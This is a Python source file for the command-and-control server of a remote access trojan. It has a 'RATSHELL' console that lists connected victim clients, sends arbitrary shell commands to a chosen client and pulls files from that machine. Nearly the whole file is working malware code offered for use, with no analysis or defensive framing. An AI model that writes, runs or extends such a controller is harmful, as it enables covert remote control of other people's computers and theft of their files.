import socket             
import threading
from entry import clientEntry

PORT = 555  

BANNER="""
  _____       __   _______ _____ _    _  ______  _        _
 |  ___ \    /  \  __   __/ ____| |  | ||  ____|| |      | |
 | |__) |   / /\ \   | | | (___ | |__| || |__   | |      | | 
 |  _  /   / /__\ \  | |  \___ \|  __  ||  __|  | |      | |
 | | \ \  /  ____  \ | |  ____) | |  | || |____ | |_____ | |_____
 |_|  \_\/_/      \_\|_| |_____/|_|  |_||______||_______||_______|
"""

HELP_TEXT = """
Available Commands:
===================
LC                - List all connected clients
CLIENT <id>       - Interact with a specific client
EXIT              - Shutdown the RAT server
HELP              - List of commands"""

class Server:
    def __init__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         
        self.s.bind(('', PORT))         
        self.s.listen(5)     
        self.clients = {}
        self.cnt=0
        self.thread_accept=True
       
    def accept_clients(self):
        while self.thread_accept: 
            try:
                self.s.settimeout(1)  
                c, addr = self.s.accept()  
                det=c.recv(1024).decode()
                det=det.split(" ")
                self.cnt += 1
                client = clientEntry.clentry((c, addr), det[0], det[1], det[2])
                self.clients[self.cnt] = client
            except socket.timeout:
                continue 
    def control_client(self,client):
        while True:
            try:
                cmd = input(f"{client.user}@{client.name}_$>")
                cm=cmd.split(" ")
                if cmd in ["back", "exit"]:
                    break
                client.fd.send(cmd.encode())
                
                if cm[0]=="download":
                    if 1==1:
                        with open(cm[1],"wb") as file:
                            while True:
                                
                                chunk=client.fd.recv(8192)
                                
                                if b"EOF" in chunk:  # Ελέγχουμε αν το EOF βρίσκεται στο chunk
                                    file.write(chunk.replace(b"EOF", b""))
                                    break
                                file.write(chunk)
                    #except:
                        #print("could not write file")
                response = client.fd.recv(8192).decode()
                print(response)
            except Exception as e:
                print(f"Error: {e}")
                break

    def shutdown(self):
        for cl in self.clients:
            cl.fd.close()
            self.clients.remove(cl)
    def list_clients(self):
        for id, client in self.clients.items():
            print(f"[{id}] {client.name} - {client.user} ({client.fd.getpeername()})")
    def help(self):
        print(HELP_TEXT)
def main():
    print(BANNER)
    server=Server()
    
    accept=threading.Thread(target=server.accept_clients)

    accept.start()

    while True:
        
        server_cm=input("RATSHELL$>")
        server_cm=server_cm.split(" ")
        if server_cm[0]=="LC" and len(server_cm)==1:
            server.list_clients()
        elif server_cm[0] == "EXIT" and len(server_cm)==1:
            
            server.thread_accept=False
            accept.join()
            server.s.close()
            break
            
        elif server_cm[0]=="CLIENT" and len(server_cm)==2:
            client_id = int(server_cm[1])
            if client_id in server.clients:
                server.control_client(server.clients[client_id])
            else:
                print("Invalid client ID.")
            

        elif server_cm[0]=="HELP":
            server.help()
        else:
            print("unknown command type help for help")
      
main()